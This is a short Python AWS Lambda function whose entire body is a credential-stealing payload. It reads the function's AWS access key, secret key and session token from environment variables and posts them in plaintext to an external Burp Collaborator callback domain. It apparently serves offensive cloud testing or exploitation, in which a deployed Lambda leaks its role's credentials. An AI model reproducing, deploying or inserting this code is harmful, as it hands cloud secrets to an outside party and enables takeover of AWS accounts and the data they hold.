#!/usr/bin/env python
from __future__ import print_function
import json
import boto3
from botocore.exceptions import ClientError
from botocore.vendored import requests
import os

POST_URL = 'http://lpesxm4r0ydnrjy3b1tte8fco3uuij.burpcollaborator.net'

# Send accesskey
def message(ak,sk,st):
    data = 'AccessKey:' + ak + ' SecretKey:' + sk + ' Token:' + st
    requests.post(POST_URL, data=data)
    return True

def lambda_handler(event, context):
    ak = os.getenv('AWS_ACCESS_KEY_ID')
    sk = os.getenv('AWS_SECRET_ACCESS_KEY')
    st = os.getenv('AWS_SESSION_TOKEN')
    message(ak,sk,st)